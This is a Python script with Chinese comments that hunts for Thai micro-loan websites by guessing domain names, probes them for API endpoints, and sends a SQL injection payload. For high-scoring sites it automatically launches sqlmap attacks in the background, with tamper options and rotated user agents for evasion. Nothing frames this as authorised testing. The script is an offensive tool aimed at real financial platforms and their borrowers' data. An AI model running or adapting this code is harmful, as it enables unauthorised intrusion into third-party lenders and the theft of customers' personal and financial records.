#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国微型贷款平台发现系统
Thai Micro Loan Platform Discovery System
"""

import requests
import re
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThaiMicroLoanDiscovery:
    """泰国微型贷款平台发现器"""

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        # 避免已知目标
        self.avoid_targets = [
            'moneycat.co.th', 'mula-x.com', 'rocket-cash.com', 'kloan.co.th',
            'ngerntidlor.com', 'peacoop.or.th', 'ngoenmun.com', 'quickcash.in.th',
            'quickcash.co.th'
        ]

        # 泰国微型贷款关键词
        self.loan_keywords = [
            'dinero', 'prestamo', 'rapido', 'facil', 'dinero',
            'cash', 'money', 'loan', 'quick', 'fast', 'easy',
            'express', 'speedy', 'instant', 'micro', 'mini'
        ]

        self.discovered_targets = []

    def generate_target_patterns(self):
        """生成目标URL模式"""
        print("生成泰国小型贷款平台URL模式...")

        # 新的组合模式
        patterns = [
            'expresscash', 'speedymoney', 'fastfund', 'quickfund',
            'easymoney', 'rapidloan', 'instantcash', 'miniloan',
            'microcash', 'tinyloan', 'nanofund', 'picocash',
            'expressloan', 'speedyloan', 'quickfund', 'fastmoney'
        ]

        domains = ['.co.th', '.in.th', '.net.th']
        potential_urls = []

        for pattern in patterns:
            for domain in domains:
                url = f"https://{pattern}{domain}"
                if not any(avoid in url for avoid in self.avoid_targets):
                    potential_urls.append(url)

        return potential_urls[:30]  # 返回前30个

    def quick_target_check(self, url):
        """快速目标检查"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8'
            }

            response = requests.get(
                url,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )

            if response.status_code == 200:
                content = response.text.lower()
                loan_score = 0

                # 检查贷款关键词
                for keyword in self.loan_keywords:
                    if keyword in content:
                        loan_score += 1

                # 检查贷款元素
                if any(element in content for element in ['application', 'apply', 'loan', 'credit', 'cash']):
                    loan_score += 2

                if loan_score >= 3:
                    return {
                        'url': url,
                        'status_code': response.status_code,
                        'loan_score': loan_score,
                        'title': self.get_title(response.text),
                        'is_loan_site': True
                    }

        except:
            pass
        return None

    def get_title(self, html_content):
        """提取网页标题"""
        try:
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return "Unknown"

    def find_api_endpoints(self, base_url):
        """查找API端点"""
        api_paths = [
            '/api/v1/users', '/api/application', '/api/loan/submit',
            '/api/user/register', '/v1/apply', '/wp-json/api/v1',
            '/mobile/api/application', '/rest/api/loan'
        ]

        discovered_apis = []

        for api_path in api_paths:
            api_url = urljoin(base_url, api_path)
            try:
                response = requests.get(
                    api_url,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=5,
                    verify=False
                )

                if response.status_code == 200:
                    discovered_apis.append({
                        'endpoint': api_path,
                        'status': response.status_code
                    })
            except:
                continue

        return discovered_apis

    def quick_injection_test(self, base_url):
        """快速注入测试"""
        test_urls = [
            f"{base_url}/application.php?id=1",
            f"{base_url}/apply?loan_id=1",
            f"{base_url}/user?user_id=1"
        ]

        injection_points = []

        for test_url in test_urls:
            try:
                # 快速测试
                params = {'id': "1' OR '1'='1"}
                response = requests.get(
                    test_url,
                    params=params,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=5,
                    verify=False
                )

                if response.elapsed.total_seconds() > 2 or 'sql' in response.text.lower():
                    injection_points.append({
                        'url': test_url,
                        'parameter': 'id',
                        'payload': "1' OR '1'='1",
                        'response_time': response.elapsed.total_seconds()
                    })
                    break

            except:
                continue

        return injection_points

    def launch_sqlmap_attacks(self, target):
        """启动SQLMap攻击"""
        attacks = []

        if target.get('injection_points'):
            for injection in target['injection_points'][:2]:
                cmd = f'sqlmap -u "{injection["url"]}" -p {injection["parameter"]} --batch --level=3 --risk=2 --random-agent --tamper=space2comment,randomcase --fresh-queries --threads=6'

                try:
                    import subprocess
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    attacks.append({
                        'type': 'SQL注入',
                        'target': injection['url'],
                        'command': cmd,
                        'status': 'launched'
                    })
                    print(f"  攻击已启动: {injection['url']}")
                except:
                    pass

        return attacks

    def generate_discovery_report(self, targets):
        """生成发现报告"""
        print(f"\n=== 泰国小型贷款平台发现报告 ===")
        print(f"发现时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"发现目标: {len(targets)}")

        report = {
            'discovery_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_targets': len(targets),
            'high_priority': [],
            'medium_priority': [],
            'low_priority': [],
            'attacks_launched': []
        }

        for target in targets:
            if target['loan_score'] >= 5:
                priority = 'high'
                # 立即攻击高优先级目标
                attacks = self.launch_sqlmap_attacks(target)
                report['attacks_launched'].extend(attacks)
            elif target['loan_score'] >= 3:
                priority = 'medium'
            else:
                priority = 'low'

            target_data = {
                'url': target['url'],
                'title': target.get('title', 'Unknown'),
                'loan_score': target['loan_score'],
                'api_endpoints': target.get('api_endpoints', []),
                'injection_points': target.get('injection_points', [])
            }

            if priority == 'high':
                report['high_priority'].append(target_data)
            elif priority == 'medium':
                report['medium_priority'].append(target_data)
            else:
                report['low_priority'].append(target_data)

        # 保存报告
        with open('thai_micro_loan_discovery_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n目标分类:")
        print(f"  高优先级: {len(report['high_priority'])}")
        print(f"  中优先级: {len(report['medium_priority'])}")
        print(f"  低优先级: {len(report['low_priority'])}")
        print(f"  已启动攻击: {len(report['attacks_launched'])}")

        return report

    def run_discovery(self):
        """运行发现流程"""
        print("启动泰国小型贷款平台快速发现系统...")

        # 1. 生成潜在目标
        potential_targets = self.generate_target_patterns()
        print(f"生成 {len(potential_targets)} 个潜在目标")

        # 2. 检查目标
        print("\n检查目标存活性...")
        live_targets = []

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.quick_target_check, url): url for url in potential_targets}

            for future in as_completed(futures):
                target = future.result()
                if target and target['is_loan_site']:
                    live_targets.append(target)
                    print(f"发现: {target['url']} (分数: {target['loan_score']})")

        print(f"\n存活的贷款网站: {len(live_targets)} 个")

        # 3. 深度扫描前10个目标
        print("\n深度扫描前10个目标...")
        live_targets.sort(key=lambda x: x['loan_score'], reverse=True)

        for i, target in enumerate(live_targets[:10]):
            print(f"\n[{i+1}/10] 深度扫描: {target['url']}")

            # 查找API端点
            apis = self.find_api_endpoints(target['url'])
            if apis:
                target['api_endpoints'] = apis
                print(f"发现API端点: {len(apis)} 个")

            # 测试注入点
            injections = self.quick_injection_test(target['url'])
            if injections:
                target['injection_points'] = injections
                print(f"发现潜在注入点: {len(injections)} 个")

        # 4. 生成报告
        self.discovered_targets = live_targets
        report = self.generate_discovery_report(live_targets)

        return report

def main():
    """主函数"""
    discovery = ThaiMicroLoanDiscovery()

    try:
        report = discovery.run_discovery()

        print(f"\n发现的高价值目标:")
        for i, target in enumerate(report['high_priority'][:5], 1):
            print(f"{i}. {target['url']} (评分: {target['loan_score']})")
            print(f"   API端点: {len(target['api_endpoints'])}, 注入点: {len(target['injection_points'])}")

        print(f"\n详细报告已保存到: thai_micro_loan_discovery_report.json")

    except KeyboardInterrupt:
        print("\n目标发现已取消")
    except Exception as e:
        print(f"发现错误: {e}")

if __name__ == "__main__":
    main()